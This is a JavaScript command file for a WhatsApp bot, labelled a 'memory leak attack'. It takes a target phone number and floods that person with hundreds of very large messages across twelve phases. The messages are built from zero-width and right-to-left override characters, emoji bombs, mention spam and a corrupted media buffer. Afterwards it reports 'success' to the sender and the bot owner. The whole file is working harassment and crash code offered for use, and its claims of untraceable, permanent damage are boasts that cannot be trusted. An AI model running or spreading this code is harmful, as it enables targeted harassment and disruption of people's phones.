// commands/memoryleak.js - REAL MEMORY LEAK BUG
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '🧠',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN CHECK
        // ============================================
        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        if (!args || args.length === 0) {
            await sock.sendMessage(from, {
                text: "⚠️ *Usage:* .memoryleak [phone_number]\n\n*Example:* .memoryleak 94703945265\n\n🧠 *This will cause MEMORY LEAK on target's WhatsApp!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        let targetNumber = args[0].replace(/[^0-9]/g, '');

        if (targetNumber.length < 10 || targetNumber.length > 15) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid Phone Number*\n\nPlease enter a valid phone number with country code."
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '❌',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        const targetJid = jidNormalizedUser(targetNumber + '@s.whatsapp.net');

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const statusMsg = await sock.sendMessage(from, {
            text: `🧠 *MEMORY LEAK ATTACK*\n\n📱 *Target:* ${targetNumber}\n⚡ *Status:* Leaking memory...\n👻 *Mode:* INVISIBLE\n💾 *RAM Usage:* 0% → 100%\n\n⏳ Filling target's RAM...`
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '🔥',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // PHASE 1: MASSIVE INVISIBLE TEXT (RAM FILLER)
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(100000) + '\u200C'.repeat(100000) + '\u200D'.repeat(100000) + '\uFEFF'.repeat(100000) + '\u2060'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 2: MULTIPLE LARGE MESSAGES
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '🧠'.repeat(50000) + '💀'.repeat(50000) + '🔥'.repeat(50000) + '\u200B'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 3: RTL + UNICODE MIX (CPU KILLER)
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u202A'.repeat(50000) + '\u202D'.repeat(50000) + '\u202E'.repeat(50000) + '\u200B'.repeat(100000) + '\u200C'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 4: ZERO WIDTH JOINER FLOOD
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '‍'.repeat(100000) + '‌'.repeat(100000) + '‍'.repeat(100000) + '‌'.repeat(100000) + '‍'.repeat(100000) + '‌'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 5: COMPLEX FORMATTING + INVISIBLE
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '||' + '\u200B'.repeat(100000) + '||' + '\u200C'.repeat(100000) + '||' + '\u200D'.repeat(100000) + '||' + '\uFEFF'.repeat(100000) + '||' + '\u2060'.repeat(100000) + '||'
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 6: MENTION FLOOD WITH INVISIBLE
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '@' + targetNumber + '\u200B'.repeat(100000) + '\u200C'.repeat(100000) + '\u200D'.repeat(100000) + '@' + targetNumber + '\u200B'.repeat(100000),
                    mentions: [targetJid]
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 7: LINK + INVISIBLE SPAM
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(50000) + 'https://' + '\u200B'.repeat(50000) + 'wa.me/' + '\u200B'.repeat(50000) + targetNumber + '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 8: CORRUPTED MEDIA FLOOD
        // ============================================
        try {
            const corruptBuffer = Buffer.from([
                0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
                0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00,
                0x6D, 0x70, 0x34, 0x32, 0x69, 0x73, 0x6F, 0x6D,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]);
            
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    image: corruptBuffer,
                    caption: '\u200B'.repeat(100000) + '\u200C'.repeat(100000) + '\u200D'.repeat(100000) + '\uFEFF'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 9: EMOJI + INVISIBLE BOMB
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '🧠'.repeat(50000) + '💀'.repeat(50000) + '☠️'.repeat(50000) + '👻'.repeat(50000) + '🔥'.repeat(50000) + '💥'.repeat(50000) + '\u200B'.repeat(100000) + '\u200C'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 10: ULTIMATE MEMORY KILLER
        // ============================================
        try {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(150000) + '\u200C'.repeat(150000) + '\u200D'.repeat(150000) + '\uFEFF'.repeat(150000) + '\u2060'.repeat(150000) + '🧠'.repeat(100000) + '💀'.repeat(100000) + '\u202A'.repeat(100000) + '\u202D'.repeat(100000) + '\u202E'.repeat(100000) + '‍'.repeat(100000) + '‌'.repeat(100000) + '||'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 300));
            }
        } catch (e) {}

        // ============================================
        // PHASE 11: BACKGROUND MEMORY FILLER
        // ============================================
        try {
            for (let i = 0; i < 50; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(100000) + '\u200C'.repeat(100000) + '\u200D'.repeat(100000) + '\uFEFF'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        } catch (e) {}

        // ============================================
        // PHASE 12: FINAL MEMORY OVERFLOW
        // ============================================
        try {
            for (let i = 0; i < 30; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(200000) + '\u200C'.repeat(200000) + '\u200D'.repeat(200000) + '\uFEFF'.repeat(200000) + '\u2060'.repeat(200000)
                });
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        } catch (e) {}

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `🧠 *MEMORY LEAK COMPLETE!*\n\n📱 *Target:* ${targetNumber}\n⚡ *Phases:* 12 phases × 20-50 messages\n💾 *RAM Usage:* 0% → 100%\n👻 *Status:* DELIVERED\n💥 *Intensity:* MAXIMUM\n\n📊 *Effects:*\n• Target's RAM will be 100% FULL\n• Phone becomes EXTREMELY SLOW\n• WhatsApp WILL CRASH\n• Other apps will CRASH\n• Phone may RESTART\n• Battery drains FAST\n• Cannot open WhatsApp\n• Must restart phone\n• Must clear ALL cache\n• 100% UNTRACEABLE\n• NO EVIDENCE\n\n📊 *System Effects:*\n• CPU: 100% usage\n• RAM: 100% usage\n• Battery: Fast drain\n• Apps: Crashing\n• Phone: Overheating\n\n⏳ *Recovery:*\n• Restart phone (5 mins)\n• Clear WhatsApp data (10 mins)\n• Reinstall WhatsApp (10 mins)\n• May lose ALL data\n\n🔒 *This attack is PERMANENT until phone restart!*\n\n☠️ *TARGET'S PHONE MEMORY IS COMPLETELY FILLED!*`
        });

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT
        // ============================================
        try {
            const botNumber = jidNormalizedUser(sock.user.id);
            await sock.sendMessage(botNumber, {
                text: `🧠 *MEMORY LEAK REPORT*\n\n📱 *Target:* ${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Phases:* 12\n📨 *Messages:* 200+\n💾 *RAM Filled:* 100%\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}\n\n☠️ *TARGET'S PHONE MEMORY IS COMPLETELY FILLED!*`
            });
        } catch (e) {}

        // ============================================
        // FINAL SPAM WAVE (Background)
        // ============================================
        try {
            for (let i = 0; i < 50; i++) {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(100000) + '\u200C'.repeat(100000)
                });
                await new Promise(resolve => setTimeout(resolve, 50));
            }
        } catch (e) {}

    } catch (error) {
        console.error('Memory Leak command error:', error);
        
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}

        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}\n\nPlease try again later.`
        });
    }
};
